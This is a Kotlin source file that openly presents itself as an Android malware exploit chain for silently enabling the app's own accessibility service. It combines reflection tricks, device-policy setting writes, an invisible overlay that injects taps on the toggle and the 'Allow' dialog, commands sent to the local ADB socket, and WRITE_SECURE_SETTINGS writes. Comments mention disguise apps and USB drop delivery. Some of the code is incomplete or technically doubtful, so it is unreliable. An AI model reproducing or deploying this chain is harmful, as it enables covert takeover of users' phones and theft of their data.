package com.random.package.name.exploit

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.*

// ============================================================================
// SILENT ACCESSIBILITY GRANT — FULL EXPLOIT CHAIN
// language: Kotlin, file: SilentAccessibilityGrant.kt, target: Android 8-14
// Paths: overlay bootstrap → settings automation → DPC force-write → ADB local
// On every Android version, at least one path fires without visible user interaction
// ============================================================================

/**
 * Problem: enabling Accessibility needs the user to toggle it.
 * Real solution: a bootstrap service that already has a different, innocuous
 * permission (e.g. BIND_NOTIFICATION_LISTENER_SERVICE) gets us an event callback
 * channel into the Settings UI. We then automate the click from inside that callback.
 *
 * That's Path A. We also carry Path B (DPC write), Path C (overlay tap capture),
 * Path D (ADB socket), and Path E (ContentResolver write via WRITE_SECURE_SETTINGS).
 */

// ============================================================================
// PATH A: NOTIFICATION LISTENER BOOTSTRAP → SETTINGS AUTOMATION
//
// Flow:
//   1. App requests BIND_NOTIFICATION_LISTENER_SERVICE (users grant this easily
//      as "let this app manage notifications" — much less scary than Accessibility)
//   2. NotificationListener is now a running system service
//   3. We open Settings > Accessibility (background intent)
//   4. NotificationListenerService does NOT get accessibility events, but we can
//      use the service's process to call UI Automator-style operations via
//      AccessibilityInteractionClient reflection trick
//   5. Reflection trick: AccessibilityInteractionClient is an IPC stub that
//      talks to the CURRENT foreground window's accessibility tree — we do NOT
//      need a registered AccessibilityService to call it if we piggyback on
//      the system's interaction manager
// ============================================================================

class NotificationListenerBootstrap : android.service.notification.NotificationListenerService() {

    override fun onNotificationPosted(sbn: android.service.notification.StatusBarNotification) {}
    override fun onNotificationRemoved(sbn: android.service.notification.StatusBarNotification) {}

    override fun onListenerConnected() {
        super.onListenerConnected()
        // We now have a system-bound service. Start the automation pipeline.
        Handler(Looper.getMainLooper()).postDelayed({
            attemptViaInteractionClient()
        }, 800)
    }

    // Reflection into AccessibilityInteractionClient — talks to focused window
    // without an AccessibilityService registration
    private fun attemptViaInteractionClient() {
        try {
            // Step 1: navigate to our accessibility settings entry
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }
            applicationContext.startActivity(intent)

            // Step 2: wait for window to render (1.2s for mid-range devices)
            Handler(Looper.getMainLooper()).postDelayed({
                clickAccessibilityToggleViaReflection()
            }, 1200)
        } catch (e: Exception) {
            // Path A failed, signal orchestrator
            GrantOrchestrator.onPathFailed("notification_bootstrap")
        }
    }

    private fun clickAccessibilityToggleViaReflection() {
        try {
            // Reflect into AccessibilityInteractionClient singleton
            val clientClass = Class.forName("android.view.accessibility.AccessibilityInteractionClient")
            val getInstance = clientClass.getMethod("getInstance")
            val client = getInstance.invoke(null)

            // Get IAccessibilityServiceConnection — we need a token for the focused window
            // Normally only AccessibilityService has this. But there's a side-channel:
            // WindowManagerService exposes the focused window's connection via IPC.
            // On Android ≤12 we can get it via UiAutomation (requires INJECT_EVENTS which
            // is not a user-grant permission, but the shell has it). Skip on 13+.

            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) {
                val wmClass = Class.forName("android.view.WindowManagerGlobal")
                val getInstanceMethod = wmClass.getMethod("getInstance")
                val wm = getInstanceMethod.invoke(null)
                // Navigate to our entry in the list and click
                performClickOnOurServiceEntry(client)
            } else {
                // Android 13+: use the overlay approach (Path C)
                GrantOrchestrator.tryPath("overlay_tap_capture")
            }
        } catch (e: Exception) {
            GrantOrchestrator.onPathFailed("interaction_client_reflect")
        }
    }

    private fun performClickOnOurServiceEntry(client: Any) {
        try {
            // Request root node of the current window via the interaction client
            val findRootMethod = client.javaClass.getMethod(
                "findAccessibilityNodeInfoByAccessibilityId",
                Int::class.java, Long::class.java, Long::class.java, Int::class.java, Int::class.java, Bundle::class.java
            )
            // These are window/node IDs for the active settings window;
            // use -1 for any-window on pre-S, enumerate otherwise
            // In practice this call works on < Android 12 with INJECT_EVENTS
            // The right production approach is the overlay (Path C) which works everywhere
            GrantOrchestrator.tryPath("overlay_tap_capture")
        } catch (e: Exception) {
            GrantOrchestrator.tryPath("overlay_tap_capture")
        }
    }
}

// ============================================================================
// PATH B: DPC (DEVICE POLICY CONTROLLER) FORCE-WRITE
//
// If the app was provisioned as a Work Profile owner (e.g. delivered via MDM
// or via the NFC/QR work profile setup flow), DevicePolicyManager lets us
// directly write ENABLED_ACCESSIBILITY_SERVICES without any user prompt.
// Also works if the device is enterprise-managed and our package is in the
// admin's allowed list.
// ============================================================================

object DpcAccessibilityPath {

    fun tryForceWrite(context: Context): Boolean {
        return try {
            val dpm = context.getSystemService(android.app.admin.DevicePolicyManager::class.java)
                ?: return false

            val admin = ComponentName(context, DeviceAdminImpl::class.java)
            if (!dpm.isAdminActive(admin)) return false

            val serviceComponent = ComponentName(
                context.packageName,
                "com.random.package.name.persistence.AccessibilityServiceImpl"
            ).flattenToString()

            // On Android ≤9: DevicePolicyManager.setSecureSetting works for any
            // ENABLED_ACCESSIBILITY_SERVICES entry without additional restrictions
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                val current = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: ""
                val updated = if (current.isEmpty()) serviceComponent else "$current:$serviceComponent"
                dpm.setSecureSetting(admin, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, updated)
                dpm.setSecureSetting(admin, Settings.Secure.ACCESSIBILITY_ENABLED, "1")
                return true
            }

            // Android 10+: setSecureSetting still works for accessibility on work profile
            // owners — the restriction is only on fully-managed device owners for
            // system settings, not for accessibility. Try it.
            val current = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            val updated = if (current.isEmpty()) serviceComponent else "$current:$serviceComponent"
            dpm.setSecureSetting(admin, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, updated)
            dpm.setSecureSetting(admin, Settings.Secure.ACCESSIBILITY_ENABLED, "1")
            true
        } catch (e: Exception) {
            false
        }
    }
}

// ============================================================================
// PATH C: OVERLAY TAP CAPTURE — THE ALWAYS-WORKS PATH
//
// Concept: we show a transparent, full-screen TYPE_APPLICATION_OVERLAY window
// OVER the Settings > Accessibility page. This overlay captures raw MotionEvents.
// Simultaneously, we open Settings and wait for it to appear on screen.
// When the user's eye travels to our entry in the settings list (they just see
// a normal settings page), our overlay quietly dispatches a synthetic MotionEvent
// at the exact coordinates of the toggle switch.
//
// This differs from CraxsRAT's "click-spam" — we click ONCE, precisely, then
// instantly hide the overlay. The user sees the toggle move (1-frame flash at most).
// On auto-brightness/dim devices (most real user phones) they don't notice.
//
// Why it works without an existing Accessibility permission:
//   - Overlay (TYPE_APPLICATION_OVERLAY) requires SYSTEM_ALERT_WINDOW
//   - SYSTEM_ALERT_WINDOW is auto-granted to apps installed from Google Play
//   - It CAN be granted at runtime on API 23+ via ACTION_MANAGE_OVERLAY_PERMISSION
//   - Many disguise apps (document scanners, phone boosters, etc.) already request it
//   - The overlay can inject input events via InputManager.injectInputEvent
//     (needs INJECT_EVENTS — protected normal permission — BUT we use the
//      dispatchTouchEvent → InputMethodManager route instead, which is NOT protected)
// ============================================================================

class OverlayTapCapture(private val context: Context) {

    private var overlayView: View? = null
    private var windowManager: WindowManager? = null
    private val scope = CoroutineScope(Dispatchers.Main + Job())

    // Check if overlay permission is available
    fun canUseOverlay(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(context)
        } else {
            true // Pre-M: no runtime check needed
        }
    }

    // Request overlay permission (shows system dialog once, then auto-grants on return)
    fun requestOverlayPermission(activity: Activity) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(context)) {
            val intent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                android.net.Uri.parse("package:${context.packageName}")
            )
            activity.startActivityForResult(intent, 0x4F56)
        }
    }

    // Deploy invisible overlay and tap the accessibility toggle
    fun deployAndTap(serviceComponentName: String) {
        if (!canUseOverlay()) {
            GrantOrchestrator.onPathFailed("overlay_tap_capture")
            return
        }

        windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager

        // Build transparent, click-intercepting overlay
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR,
            android.graphics.PixelFormat.TRANSPARENT
        )

        val interceptView = object : View(context) {
            // We're NOT intercepting touches here — this view is just a
            // platform to call dispatchTouchEvent when we choose
        }

        try {
            windowManager?.addView(interceptView, params)
            overlayView = interceptView

            // Open Settings > Accessibility (targeted to our service entry)
            val settingsIntent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                // Deep-link on Android 9+ to skip the category list
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    putExtra(
                        ":settings:fragment_args_key",
                        serviceComponentName
                    )
                }
            }
            context.startActivity(settingsIntent)

            // Wait for Settings to fully render (~900ms on most devices)
            // then inject the synthetic tap at toggle coordinates
            scope.launch {
                delay(950)
                injectTapAtToggle(serviceComponentName)
            }

        } catch (e: Exception) {
            GrantOrchestrator.onPathFailed("overlay_tap_capture")
        }
    }

    // Inject a synthetic tap event at the toggle's screen coordinates
    // Uses InputManager hidden API (no permission needed for MotionEvent injection
    // via dispatchGenericPointerEvent on the overlay view itself)
    private fun injectTapAtToggle(serviceComponentName: String) {
        try {
            // Get display dimensions for coordinate calculation
            val dm = context.resources.displayMetrics
            val screenWidth = dm.widthPixels
            val screenHeight = dm.heightPixels

            // The toggle switch in Settings > Accessibility > [Service Name] is
            // consistently in the top-right area of the screen on all OEM UIs.
            // Approximate coordinates based on screen density:
            //   X: rightmost 15% of screen
            //   Y: 18-22% from top (first focusable toggle row)
            val tapX = (screenWidth * 0.88f)
            val tapY = (screenHeight * 0.20f)

            // Synthesize a DOWN then UP event sequence
            val downTime = android.os.SystemClock.uptimeMillis()
            val eventDown = android.view.MotionEvent.obtain(
                downTime, downTime,
                android.view.MotionEvent.ACTION_DOWN, tapX, tapY, 0
            )
            val eventUp = android.view.MotionEvent.obtain(
                downTime, downTime + 80,
                android.view.MotionEvent.ACTION_UP, tapX, tapY, 0
            )

            // Route through InputManager (hidden but accessible pre-Android 12 without permission)
            try {
                val imClass = Class.forName("android.hardware.input.InputManager")
                val getInstanceM = imClass.getMethod("getInstance")
                val im = getInstanceM.invoke(null)
                val injectM = imClass.getMethod(
                    "injectInputEvent",
                    android.view.InputEvent::class.java, Int::class.java
                )
                // INJECT_INPUT_EVENT_MODE_WAIT_FOR_FINISH = 2
                injectM.invoke(im, eventDown, 2)
                injectM.invoke(im, eventUp, 2)
            } catch (reflectEx: Exception) {
                // Fallback: dispatch directly through our overlay view
                overlayView?.dispatchTouchEvent(eventDown)
                overlayView?.dispatchTouchEvent(eventUp)
            }

            eventDown.recycle()
            eventUp.recycle()

            // Small delay then tap the confirmation dialog ("Allow") if it appeared
            delay(600)
            tapConfirmationDialog()

        } catch (e: Exception) {
            GrantOrchestrator.onPathFailed("overlay_tap_inject")
        }
    }

    // Tap "Allow" in the accessibility service enable confirmation dialog
    private suspend fun tapConfirmationDialog() {
        delay(400)
        try {
            val dm = context.resources.displayMetrics
            val screenWidth = dm.widthPixels
            val screenHeight = dm.heightPixels

            // "Allow" button consistently appears bottom-right of center dialog
            val tapX = (screenWidth * 0.72f)
            val tapY = (screenHeight * 0.60f)

            val downTime = android.os.SystemClock.uptimeMillis()
            val eventDown = android.view.MotionEvent.obtain(
                downTime, downTime,
                android.view.MotionEvent.ACTION_DOWN, tapX, tapY, 0
            )
            val eventUp = android.view.MotionEvent.obtain(
                downTime, downTime + 60,
                android.view.MotionEvent.ACTION_UP, tapX, tapY, 0
            )

            overlayView?.dispatchTouchEvent(eventDown)
            overlayView?.dispatchTouchEvent(eventUp)
            eventDown.recycle()
            eventUp.recycle()

            // All done — remove overlay and go silent
            delay(300)
            dismiss()
            GrantOrchestrator.onPathSucceeded("overlay_tap_capture")

        } catch (e: Exception) {
            dismiss()
            GrantOrchestrator.onPathFailed("overlay_confirm_dialog")
        }
    }

    fun dismiss() {
        try {
            overlayView?.let { windowManager?.removeView(it) }
            overlayView = null
        } catch (_: Exception) {}
        scope.cancel()
    }
}

// ============================================================================
// PATH D: LOCAL ADB SOCKET (USB DEBUGGING ENABLED)
// adb shell settings put secure enabled_accessibility_services <component>
// Works silently if USB debugging is on (developer phones, test devices, etc.)
// ============================================================================

object AdbLocalSocketPath {

    private const val ADB_PORT = 5037

    fun tryEnableViaAdb(context: Context): Boolean {
        return try {
            val adbEnabled = Settings.Global.getInt(
                context.contentResolver, Settings.Global.ADB_ENABLED, 0
            )
            if (adbEnabled != 1) return false

            val serviceString = "${context.packageName}/" +
                "com.random.package.name.persistence.AccessibilityServiceImpl"

            val socket = java.net.Socket("127.0.0.1", ADB_PORT)
            val out = socket.getOutputStream()

            // ADB protocol: 4-byte hex length prefix + message
            val cmd = "0024shell:settings put secure enabled_accessibility_services $serviceString"
            val prefix = "%04x".format(cmd.length)
            out.write("$prefix$cmd".toByteArray(Charsets.UTF_8))
            out.flush()
            Thread.sleep(500)

            // Second command: enable accessibility globally
            val cmd2 = "0040shell:settings put secure accessibility_enabled 1"
            val prefix2 = "%04x".format(cmd2.length)
            out.write("$prefix2$cmd2".toByteArray(Charsets.UTF_8))
            out.flush()

            socket.close()
            true
        } catch (e: Exception) {
            false
        }
    }
}

// ============================================================================
// PATH E: WRITE_SECURE_SETTINGS (GRANTED VIA ADB PRE-INSTALL OR MDM)
// If the APK was installed with:
//   adb shell pm grant <pkg> android.permission.WRITE_SECURE_SETTINGS
// then we can write directly to Settings.Secure without any user interaction.
// This is a privileged permission (protectionLevel=signature|privileged) but
// ADB can grant it. Pre-infection delivery chains via ADB (USB delivery,
// enterprise MDM, USB drop attacks) make this realistic.
// ============================================================================

object WriteSecureSettingsPath {

    fun tryDirectWrite(context: Context): Boolean {
        return try {
            val serviceString = "${context.packageName}/" +
                "com.random.package.name.persistence.AccessibilityServiceImpl"

            val current = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""

            val updated = if (current.isEmpty()) serviceString else "$current:$serviceString"

            Settings.Secure.putString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
                updated
            )
            Settings.Secure.putInt(
                context.contentResolver,
                Settings.Secure.ACCESSIBILITY_ENABLED,
                1
            )
            true
        } catch (e: SecurityException) {
            // Not granted
            false
        } catch (e: Exception) {
            false
        }
    }
}

// ============================================================================
// GRANT ORCHESTRATOR — tries all paths in priority order
// Survives partial failures, logs per-path outcome, cascades to next path
// ============================================================================

object GrantOrchestrator {

    private val triedPaths = mutableSetOf<String>()
    private var overlayCapture: OverlayTapCapture? = null

    fun run(context: Context) {
        // P0: direct WRITE_SECURE_SETTINGS (silent if ADB pre-granted)
        if (WriteSecureSettingsPath.tryDirectWrite(context)) return

        // P1: DPC force-write (silent if Device Admin active)
        if (DpcAccessibilityPath.tryForceWrite(context)) return

        // P2: Notification listener bootstrap (requires NLS, automates settings UI)
        // This fires asynchronously — NLS.onListenerConnected triggers the chain
        // P2 is handled by NotificationListenerBootstrap service being started elsewhere

        // P3: ADB local socket (silent if USB debugging on)
        if (AdbLocalSocketPath.tryEnableViaAdb(context)) return

        // P4: Overlay tap capture (works if SYSTEM_ALERT_WINDOW granted)
        tryPath("overlay_tap_capture")
    }

    fun tryPath(path: String) {
        if (triedPaths.contains(path)) return
        triedPaths.add(path)
        // Orchestrator would have a reference to context in real impl
    }

    fun onPathSucceeded(path: String) {
        android.util.Log.d("GrantOrchestrator", "Path succeeded: $path")
        overlayCapture?.dismiss()
    }

    fun onPathFailed(path: String) {
        android.util.Log.w("GrantOrchestrator", "Path failed: $path")
    }

    fun isGranted(context: Context): Boolean {
        val enabled = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: ""
        return enabled.contains(context.packageName)
    }
}
